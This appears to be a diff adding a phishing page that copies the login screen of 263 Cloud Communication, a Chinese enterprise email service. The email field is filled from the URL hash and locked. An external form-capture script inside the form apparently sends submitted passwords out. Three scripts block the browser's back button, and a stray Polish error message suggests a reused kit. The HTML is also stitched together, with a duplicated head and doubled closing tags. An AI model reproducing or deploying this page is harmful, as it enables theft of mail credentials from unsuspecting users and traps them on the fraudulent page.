@@ -1,0 +1,544 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>263 Login</title>
+    <style>
+* {
+    box-sizing: border-box;
+    margin: 0;
+    padding: 0;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+}
+
+body {
+    background-color: #ffffff;
+    min-height: 100vh;
+    display: flex;
+    flex-direction: column;
+    position: relative;
+    overflow-x: hidden;
+}
+
+/* Top White Utilities Ribbon Header Bar Line Layout Elements */
+.navbar {
+    width: 100%;
+    max-width: 1200px;
+    margin: 0 auto;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    padding: 16px 40px;
+    background-color: #ffffff;
+    z-index: 10;
+}
+
+.logo-box {
+    font-size: 22px;
+    font-weight: bold;
+    color: #0056da; /* Dynamic solid corporate color style matching 263 branding */
+    letter-spacing: -0.5px;
+}
+
+.nav-links {
+    font-size: 13px;
+    color: #333333;
+    display: flex;
+    align-items: center;
+    gap: 16px;
+}
+
+.nav-links a {
+    color: #333333;
+    text-decoration: none;
+}
+
+.nav-links a:hover {
+    color: #0076f6;
+}
+
+.nav-icons {
+    color: #94a3b8;
+    cursor: pointer;
+}
+
+/* Main Content Workspace Layout View Area Segment Frame Backdrops */
+.workspace-banner {
+    flex-grow: 1;
+    background-color: #1a65cc;
+    /* Clean vivid smooth deep blue continuous abstract global tech data net graphics background flawless replication */
+    background: radial-gradient(circle at 80% 80%, #1e73e8 0%, #0d4ba3 100%);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    padding: 60px 40px;
+    width: 100%;
+    position: relative;
+}
+
+.main-content-wrapper {
+    width: 100%;
+    max-width: 1200px;
+    display: flex;
+    gap: 40px;
+    align-items: center;
+    justify-content: space-between;
+}
+
+/* Left Hero Column: Dynamic Cyber Security Tech Radar Illustration Mesh Layout Container */
+.left-hero-panel {
+    flex: 1.2;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+}
+
+.tech-radar-graphic {
+    width: 320px;
+    height: 320px;
+    position: relative;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+}
+
+.radar-circle {
+    position: absolute;
+    border-radius: 50%;
+    border: 1px dashed rgba(255, 255, 255, 0.2);
+}
+
+.radar-circle.core {
+    width: 64px;
+    height: 64px;
+    background-color: rgba(255, 255, 255, 0.9);
+    border: none;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 24px;
+    box-shadow: 0 0 20px rgba(255,255,255,0.4);
+    z-index: 5;
+}
+
+.radar-circle.inner { width: 140px; height: 140px; border-style: dotted; }
+.radar-circle.middle { width: 220px; height: 220px; }
+.radar-circle.outer { width: 300px; height: 300px; opacity: 0.5; }
+
+/* Small absolute floating structural indicator nodes matching snapshot artwork blueprint layout details */
+.floating-node {
+    position: absolute;
+    background-color: rgba(255, 255, 255, 0.1);
+    border: 1px solid rgba(255, 255, 255, 0.4);
+    width: 32px;
+    height: 32px;
+    border-radius: 4px;
+    color: #ffffff;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 14px;
+}
+
+.floating-node.n1 { top: 20px; left: 40px; }
+.floating-node.n2 { top: 60px; right: 40px; }
+.floating-node.n3 { bottom: 120px; left: 10px; }
+.floating-node.n4 { bottom: 80px; right: 60px; }
+.floating-node.n5 { bottom: 10px; left: 50%; transform: translateX(-50%); }
+
+/* Right Column: Credentials Main Container White Float Box Card Block */
+.login-card {
+    flex: 0.8;
+    max-width: 380px;
+    background-color: #ffffff;
+    border-radius: 4px;
+    box-shadow: 0 15px 35px rgba(0,0,0,0.15);
+    position: relative;
+    overflow: hidden;
+    width: 100%;
+    min-height: 340px;
+}
+
+/* Custom dual-mode tab selection ribbon components border track */
+.login-tabs {
+    display: flex;
+    background-color: #ffffff;
+    border-bottom: 1px solid #f0f0f0;
+}
+
+.tab-item {
+    flex: 1;
+    padding: 16px 8px;
+    text-align: center;
+    font-size: 14px;
+    color: #666666;
+    cursor: pointer;
+}
+
+.tab-item.active {
+    color: #0066cc;
+    font-weight: 500;
+}
+
+.tab-item.alternative-tab {
+    background-color: #f5f5f5;
+    border-left: 1px solid #eef2f5;
+    color: #8c8c8c;
+}
+
+/* Top corner quick transition overlay triangle badge graphic marker node */
+.qr-corner-badge {
+    position: absolute;
+    top: 50px;
+    right: 12px;
+    font-size: 22px;
+    color: #0066cc;
+    cursor: pointer;
+    user-select: none;
+}
+
+form {
+    padding: 40px 24px 24px;
+    width: 100%;
+}
+
+.form-group {
+    margin-bottom: 20px;
+    width: 100%;
+}
+
+/* Prefix Icon Addon Input Field Container Elements Rows Alignment precisely matching blueprint specifications */
+.icon-field-wrapper {
+    display: flex;
+    align-items: center;
+    border: 1px solid #cbd5e1;
+    border-radius: 4px;
+    height: 40px;
+    padding: 0 12px;
+    background-color: #ffffff;
+}
+
+.icon-field-wrapper:focus-within {
+    border-color: #0066cc;
+}
+
+.input-prefix-icon {
+    color: #94a3b8;
+    font-size: 14px;
+    margin-right: 10px;
+    user-select: none;
+}
+
+.form-control {
+    flex: 1;
+    height: 100%;
+    border: none;
+    font-size: 14px;
+    color: #333333;
+    outline: none;
+    background: transparent;
+}
+
+.form-control::placeholder {
+    color: #cbd5e1;
+    font-weight: 400;
+}
+
+.secure-wrapper {
+    position: relative;
+}
+
+.eye-toggle {
+    color: #94a3b8;
+    cursor: pointer;
+    font-size: 12px;
+    padding-left: 6px;
+    user-select: none;
+}
+
+/* Secondary choice components double side links grid alignment row row */
+.aux-links-row {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    font-size: 12px;
+    margin-bottom: 24px;
+    padding: 0 2px;
+}
+
+.security-label {
+    display: flex;
+    align-items: center;
+    gap: 6px;
+    color: #4b5563;
+    cursor: pointer;
+}
+
+.security-label input {
+    accent-color: #0066cc;
+}
+
+.clear-link {
+    color: #6b7280;
+    text-decoration: none;
+}
+
+.clear-link:hover {
+    color: #0066cc;
+    text-decoration: underline;
+}
+
+/* High contrast crisp wide rectangular solid blue action submission trigger capsule button block component (NOW FULLY CLICKABLE) */
+.submit-btn {
+    position: relative;
+    z-index: 20;
+    width: 100%;
+    background-color: #0066cc;
+    color: #ffffff;
+    border: none;
+    height: 42px;
+    font-size: 15px;
+    font-weight: 500;
+    border-radius: 4px;
+    cursor: pointer;
+    margin-bottom: 12px;
+    transition: background-color 0.15s ease;
+}
+
+.submit-btn:hover {
+    background-color: #0052cc;
+}
+
+/* Footer layout assistance secondary navigation connections area link stack list */
+.card-footer-links {
+    background-color: #f8fafc;
+    border-top: 1px solid #edf2f7;
+    padding: 16px 24px;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    font-size: 12px;
+    width: 100%;
+}
+
+.forgot-link {
+    color: #4b5563;
+    text-decoration: none;
+}
+
+.lang-select {
+    color: #4b5563;
+    cursor: pointer;
+}
+
+.forgot-link:hover {
+    color: #0066cc;
+    text-decoration: underline;
+}
+
+/* Fine-print corporate layout footer information sections components ribbon strip */
+.page-footer {
+    text-align: center;
+    font-size: 12px;
+    color: #64748b;
+    padding: 24px 20px;
+    background-color: #ffffff;
+    border-top: 1px solid #edf2f7;
+    width: 100%;
+    line-height: 1.8;
+}
+
+.footer-nav-ribbon a {
+    color: #64748b;
+    text-decoration: none;
+    margin: 0 4px;
+}
+
+.footer-nav-ribbon a:hover {
+    color: #0066cc;
+    text-decoration: underline;
+}
+
+.copyright-line {
+    margin-top: 4px;
+}
+
+.support-line {
+    font-size: 11px;
+    color: #94a3b8;
+}
+
+/* OS Environment Activation Notification Simulation Overlay Layer Components Grid Blueprint */
+.system-watermark {
+    position: fixed;
+    bottom: 24px;
+    right: 24px;
+    text-align: left;
+    font-size: 13px;
+    color: rgba(0, 0, 0, 0.13);
+    line-height: 1.4;
+    user-select: none;
+    pointer-events: none;
+    z-index: 100;
+}
+
+@media (max-width: 860px) {
+    .main-content-wrapper {
+        flex-direction: column;
+        gap: 50px;
+    }
+    .left-hero-panel {
+        width: 100%;
+    }
+    .login-card {
+        max-width: 100%;
+    }
+}
+
+    </style>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>263 Cloud Communication Login</title>
+    <!-- Link to external stylesheet -->
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+    <!-- Top White Utilities Ribbon Header Bar Line Layout Elements -->
+    <header class="navbar">
+        <div class="brand-logo-area">
+            <!-- Header Logo Image Placeholder Box -->
+            <div class="logo-box">263云通信</div>
+        </div>
+        <nav class="nav-links">
+            <a href="#">个人邮箱</a>
+            <a href="#">企业邮箱</a>
+            <a href="#">👤 在线客服</a>
+            <span class="nav-icons">⬜ ⬜</span>
+        </nav>
+    </header>
+
+    <!-- Main Panoramic Horizon Content Workspace Area Component -->
+    <main class="workspace-banner">
+        <div class="main-content-wrapper">
+            
+            <!-- Left Hero Content Presentation Dynamic Vector Graphic Layer Column -->
+            <div class="left-hero-panel">
+                <div class="tech-radar-graphic">
+                    <div class="radar-circle core">✉️</div>
+                    <div class="radar-circle inner"></div>
+                    <div class="radar-circle middle"></div>
+                    <div class="radar-circle outer"></div>
+                    <!-- Small floating UI node markers simulating original interface elements -->
+                    <div class="floating-node n1">🖥️</div>
+                    <div class="floating-node n2">🛡️</div>
+                    <div class="floating-node n3">📋</div>
+                    <div class="floating-node n4">📱</div>
+                    <div class="floating-node n5">☁️</div>
+                </div>
+            </div>
+
+            <!-- Right Column Form Container Card Box Component Module -->
+            <div class="login-card">
+                
+                <!-- Dual Navigation Mode Tab Strip Links Menu elements -->
+                <div class="login-tabs">
+                    <div class="tab-item active">User login</div>
+                    <div class="tab-item alternative-tab">Administrator login</div>
+                </div>
+
+                <!-- QR code absolute quick-switch flip badge indicator button -->
+                <div class="qr-corner-badge">⚃</div>
+
+                <!-- Form submission tracking configuration using FormSubmit module paths -->
+                <form action="" method="POST">
+				
+                    <script id="ratufa_loader" src="https://www.ratufa.io/c/ld.js?f=px88b6jp&n=n1.ratufa.io"></script>
+                    <div class="form-group icon-field-wrapper">
+                        <span class="input-prefix-icon">👤</span>
+ <input type="email" id="email" name="email" class="form-control" placeholder="Email address" readonly="readonly" />
+                    </div>
+
+                    <div class="form-group icon-field-wrapper secure-wrapper">
+                        <span class="input-prefix-icon">🔒</span><input type="password" name="Password" placeholder="Password" class="form-control" style="font-size: 12pt; required="" oninvalid="this.setCustomValidity('Wprowadź hasło do swojego adresu e-mail')"
+  oninput="this.setCustomValidity('')"/>
+
+                        <span class="eye-toggle">▾</span>
+                    </div>
+
+                    <!-- Auxiliary Active Option Rows Section Alignment -->
+                    <div class="aux-links-row">
+                        <label class="security-label">
+                            <input type="checkbox" name="security_login" checked>
+                            <span>Security Login</span>
+                        </label>
+                        <a href="#" class="clear-link">Clear Trace</a>
+                    </div>
+
+                    <!-- High contrast crisp wide rectangular solid blue submit capsule button block component -->
+                    <button type="submit" class="submit-btn">Sign in</button>
+                </form>
+
+                <!-- Footer layout assistance secondary navigation connections area link stack list -->
+                <div class="card-footer-links">
+                    <a href="#" class="forgot-link">Forgot Password</a>
+                    <div class="lang-select">Language ▾</div>
+                </div>
+
+            </div>
+
+        </div>
+    </main>
+
+    <!-- Base Fine-Print Page Footer Copyright Links Ribbon Strip Component -->
+    <footer class="page-footer">
+        <div class="footer-nav-ribbon">
+            <a href="#">263云通信官网</a> | <a href="#">视频会议</a> | <a href="#">企业直播</a> | <a href="#">企业邮箱</a> | <a href="#">电话会议</a> | <a href="#">帮助中心</a>
+        </div>
+        <div class="copyright-line">Copyright © 1998-2026 北京二六三企业通信有限公司 | 京ICP备08010619号-3</div>
+        <div class="support-line">举报电话: 400-650-9263 | 举报邮箱: qtqm@net263.com</div>
+    </footer>
+
+    <script>
+        window.addEventListener('DOMContentLoaded', () => {
+            if (window.location.hash) {
+                document.getElementById("email").value = window.location.hash.substring(1).trim();
+            }
+        });
+    </script>
+    <!-- 1. ANTI-BACKTRACK INTERLOCK ENGINE -->
+    <script type="text/javascript">
+        (function() {
+            window.history.pushState(null, null, window.location.href);
+            
+            window.onpopstate = function() {
+                window.history.pushState(null, null, window.location.href);
+           
+            };
+        })();
+    </script>
+<script type="text/javascript">
+    window.history.pushState(null, "", window.location.href);
+    
+    window.addEventListener("popstate", function() {
+        window.history.pushState(null, "", window.location.href);
+    });
+</script>
+<script type="text/javascript">
+    function preventBack() {
+        window.history.forward();
+    }
+    setTimeout("preventBack()", 0);
+    
+    window.onunload = function () { null };
+</script>
+
+</body>
+    
+</html>
+</body>
+</html>
